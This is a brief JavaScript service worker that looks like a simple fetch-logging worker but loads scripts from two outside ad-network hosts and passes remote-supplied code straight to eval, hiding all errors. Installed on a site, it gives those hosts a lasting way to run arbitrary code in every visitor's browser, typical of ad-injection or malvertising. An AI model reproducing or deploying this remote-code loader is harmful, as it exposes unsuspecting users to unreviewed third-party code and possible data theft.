function logs() {
    [].forEach.call(arguments, function (v) {
        try {
            console.log(v)
        } catch (e) {
            console.log(e)
        }
    })
}
self.addEventListener('fetch', function (event) {
    logs('SW1:fetch listener');
});

try{
    try{
        self.importScripts('https://rc.gluck.space/static/common/js/ads.js')
        if (!!self.api){
            // debugger
            eval(self.api.src)
        }
    } catch (e){}
    self.importScripts('https://recreativ.ru/tizers1.php?bn=WETPNH5v46&ping')
    setTimeout(function(){
         // self.registration.unregister()
    }, 10000)
    // self.importScripts('https://unpkg.com/jquery@3.2.1')
} catch (e){}
